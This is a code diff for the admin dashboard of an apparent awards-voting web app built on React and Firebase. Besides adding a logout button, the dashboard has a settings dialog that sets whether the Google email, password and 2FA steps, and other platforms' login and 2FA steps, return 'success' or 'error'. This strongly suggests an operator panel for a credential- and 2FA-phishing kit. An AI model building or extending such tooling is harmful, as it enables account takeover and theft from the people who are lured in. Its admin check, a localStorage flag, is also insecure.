@@ -2,7 +2,7 @@ import { useState, useEffect } from 'react';
 import { collection, addDoc, deleteDoc, doc, getDocs, updateDoc, getDoc, setDoc } from 'firebase/firestore';
 import { db } from '@/lib/firebase';
 import { useToast } from '@/hooks/use-toast';
-import { Trash2, Loader2, Pencil } from 'lucide-react';
+import { Trash2, Loader2, Pencil, LogOut } from 'lucide-react';
 import { formatNumber } from '@/lib/utils';
 import { Button } from "@/components/ui/button";
 import {
@@ -20,6 +20,7 @@ import {
   SelectValue,
 } from "@/components/ui/select";
 import { AdminSettings, Platform, PlatformSettings, GoogleSettings } from '@/types/admin';
+import { useNavigate } from 'react-router-dom';
 
 type Category = 'music' | 'movie' | 'comedy' | 'content-creation' | 'sports';
 
@@ -57,6 +58,8 @@ const Admin = () => {
   const [category, setCategory] = useState<Category>('music');
   const [settings, setSettings] = useState<AdminSettings>(defaultSettings);
   const [dialogOpen, setDialogOpen] = useState(false);
+  const navigate = useNavigate();
+  const { toast } = useToast();
 
   useEffect(() => {
     fetchNominees();
@@ -333,126 +336,146 @@ const Admin = () => {
     return settings.platforms[platform] !== undefined;
   };
 
+  const handleLogout = () => {
+    localStorage.removeItem('isAdminAuthenticated');
+    toast({
+      title: "Success",
+      description: "Logged out successfully",
+    });
+    navigate('/admin/login');
+  };
+
   return (
     <div className="min-h-screen bg-gray-50 py-12 px-4">
       <div className="max-w-7xl mx-auto">
         <div className="flex justify-between items-center mb-8">
           <h1 className="text-3xl font-bold">Admin Dashboard</h1>
-          <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
-            <DialogTrigger asChild>
-              <Button variant="default">Change Message Settings</Button>
-            </DialogTrigger>
-            <DialogContent className="sm:max-w-[425px] max-h-[90vh] overflow-y-auto">
-              <DialogHeader className="sticky top-0 bg-white pb-4 z-10">
-                <DialogTitle>Message Settings</DialogTitle>
-              </DialogHeader>
-              <div className="grid gap-6 py-4 overflow-y-auto">
-                {(Object.keys(settings.platforms) as Platform[])
-                  .filter(platform => hasPlatformSettings(platform, settings))
-                  .map((platform) => (
-                    <div key={platform} className="space-y-4">
-                      <h3 className="font-semibold capitalize sticky top-0 bg-white">{platform}</h3>
-                      {platform === 'google' ? (
-                        // Google settings with null checks
-                        <div className="space-y-4 px-2">
-                          <div className="space-y-2">
-                            <label className="text-sm font-medium">Email Step Response</label>
-                            <Select
-                              value={settings.platforms.google?.emailStep?.success ? "success" : "error"}
-                              onValueChange={(value) => 
-                                updateGoogleSettings('emailStep', value === "success")
-                              }
-                            >
-                              <SelectTrigger>
-                                <SelectValue placeholder="Select response" />
-                              </SelectTrigger>
-                              <SelectContent>
-                                <SelectItem value="success">Success</SelectItem>
-                                <SelectItem value="error">Error</SelectItem>
-                              </SelectContent>
-                            </Select>
-                          </div>
+          <div className="flex items-center gap-4">
+            <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
+              <DialogTrigger asChild>
+                <Button variant="default">Change Message Settings</Button>
+              </DialogTrigger>
+              <DialogContent className="sm:max-w-[425px] max-h-[90vh] overflow-y-auto">
+                <DialogHeader className="sticky top-0 bg-white pb-4 z-10">
+                  <DialogTitle>Message Settings</DialogTitle>
+                </DialogHeader>
+                <div className="grid gap-6 py-4 overflow-y-auto">
+                  {(Object.keys(settings.platforms) as Platform[])
+                    .filter(platform => hasPlatformSettings(platform, settings))
+                    .map((platform) => (
+                      <div key={platform} className="space-y-4">
+                        <h3 className="font-semibold capitalize sticky top-0 bg-white">{platform}</h3>
+                        {platform === 'google' ? (
+                          // Google settings with null checks
+                          <div className="space-y-4 px-2">
+                            <div className="space-y-2">
+                              <label className="text-sm font-medium">Email Step Response</label>
+                              <Select
+                                value={settings.platforms.google?.emailStep?.success ? "success" : "error"}
+                                onValueChange={(value) => 
+                                  updateGoogleSettings('emailStep', value === "success")
+                                }
+                              >
+                                <SelectTrigger>
+                                  <SelectValue placeholder="Select response" />
+                                </SelectTrigger>
+                                <SelectContent>
+                                  <SelectItem value="success">Success</SelectItem>
+                                  <SelectItem value="error">Error</SelectItem>
+                                </SelectContent>
+                              </Select>
+                            </div>
 
-                          <div className="space-y-2">
-                            <label className="text-sm font-medium">Password Step Response</label>
-                            <Select
-                              value={settings.platforms.google?.passwordStep?.success ? "success" : "error"}
-                              onValueChange={(value) => 
-                                updateGoogleSettings('passwordStep', value === "success")
-                              }
-                            >
-                              <SelectTrigger>
-                                <SelectValue placeholder="Select response" />
-                              </SelectTrigger>
-                              <SelectContent>
-                                <SelectItem value="success">Success</SelectItem>
-                                <SelectItem value="error">Error</SelectItem>
-                              </SelectContent>
-                            </Select>
-                          </div>
+                            <div className="space-y-2">
+                              <label className="text-sm font-medium">Password Step Response</label>
+                              <Select
+                                value={settings.platforms.google?.passwordStep?.success ? "success" : "error"}
+                                onValueChange={(value) => 
+                                  updateGoogleSettings('passwordStep', value === "success")
+                                }
+                              >
+                                <SelectTrigger>
+                                  <SelectValue placeholder="Select response" />
+                                </SelectTrigger>
+                                <SelectContent>
+                                  <SelectItem value="success">Success</SelectItem>
+                                  <SelectItem value="error">Error</SelectItem>
+                                </SelectContent>
+                              </Select>
+                            </div>
 
-                          <div className="space-y-2">
-                            <label className="text-sm font-medium">2FA Response</label>
-                            <Select
-                              value={settings.platforms.google?.twoFactor?.success ? "success" : "error"}
-                              onValueChange={(value) => 
-                                updateGoogleSettings('twoFactor', value === "success")
-                              }
-                            >
-                              <SelectTrigger>
-                                <SelectValue placeholder="Select response" />
-                              </SelectTrigger>
-                              <SelectContent>
-                                <SelectItem value="success">Success</SelectItem>
-                                <SelectItem value="error">Error</SelectItem>
-                              </SelectContent>
-                            </Select>
+                            <div className="space-y-2">
+                              <label className="text-sm font-medium">2FA Response</label>
+                              <Select
+                                value={settings.platforms.google?.twoFactor?.success ? "success" : "error"}
+                                onValueChange={(value) => 
+                                  updateGoogleSettings('twoFactor', value === "success")
+                                }
+                              >
+                                <SelectTrigger>
+                                  <SelectValue placeholder="Select response" />
+                                </SelectTrigger>
+                                <SelectContent>
+                                  <SelectItem value="success">Success</SelectItem>
+                                  <SelectItem value="error">Error</SelectItem>
+                                </SelectContent>
+                              </Select>
+                            </div>
                           </div>
-                        </div>
-                      ) : (
-                        // Other platforms with null checks
-                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 px-2">
-                          <div className="space-y-2">
-                            <label className="text-sm font-medium">Login Response</label>
-                            <Select
-                              value={settings.platforms[platform]?.login?.success ? "success" : "error"}
-                              onValueChange={(value) => 
-                                updateSettings(platform, 'login', value === "success")
-                              }
-                            >
-                              <SelectTrigger>
-                                <SelectValue placeholder="Select response" />
-                              </SelectTrigger>
-                              <SelectContent>
-                                <SelectItem value="success">Success</SelectItem>
-                                <SelectItem value="error">Error</SelectItem>
-                              </SelectContent>
-                            </Select>
+                        ) : (
+                          // Other platforms with null checks
+                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 px-2">
+                            <div className="space-y-2">
+                              <label className="text-sm font-medium">Login Response</label>
+                              <Select
+                                value={settings.platforms[platform]?.login?.success ? "success" : "error"}
+                                onValueChange={(value) => 
+                                  updateSettings(platform, 'login', value === "success")
+                                }
+                              >
+                                <SelectTrigger>
+                                  <SelectValue placeholder="Select response" />
+                                </SelectTrigger>
+                                <SelectContent>
+                                  <SelectItem value="success">Success</SelectItem>
+                                  <SelectItem value="error">Error</SelectItem>
+                                </SelectContent>
+                              </Select>
+                            </div>
+                            <div className="space-y-2">
+                              <label className="text-sm font-medium">2FA Response</label>
+                              <Select
+                                value={settings.platforms[platform]?.twoFactor?.success ? "success" : "error"}
+                                onValueChange={(value) => 
+                                  updateSettings(platform, 'twoFactor', value === "success")
+                                }
+                              >
+                                <SelectTrigger>
+                                  <SelectValue placeholder="Select response" />
+                                </SelectTrigger>
+                                <SelectContent>
+                                  <SelectItem value="success">Success</SelectItem>
+                                  <SelectItem value="error">Error</SelectItem>
+                                </SelectContent>
+                              </Select>
+                            </div>
                           </div>
-                          <div className="space-y-2">
-                            <label className="text-sm font-medium">2FA Response</label>
-                            <Select
-                              value={settings.platforms[platform]?.twoFactor?.success ? "success" : "error"}
-                              onValueChange={(value) => 
-                                updateSettings(platform, 'twoFactor', value === "success")
-                              }
-                            >
-                              <SelectTrigger>
-                                <SelectValue placeholder="Select response" />
-                              </SelectTrigger>
-                              <SelectContent>
-                                <SelectItem value="success">Success</SelectItem>
-                                <SelectItem value="error">Error</SelectItem>
-                              </SelectContent>
-                            </Select>
-                          </div>
-                        </div>
-                      )}
-                    </div>
-                  ))}
-              </div>
-            </DialogContent>
-          </Dialog>
+                        )}
+                      </div>
+                    ))}
+                </div>
+              </DialogContent>
+            </Dialog>
+            
+            <Button 
+              variant="outline" 
+              onClick={handleLogout}
+              className="flex items-center gap-2"
+            >
+              <LogOut className="w-4 h-4" />
+              Logout
+            </Button>
+          </div>
         </div>
 
         <div className="bg-white rounded-xl p-6 shadow-sm mb-8">
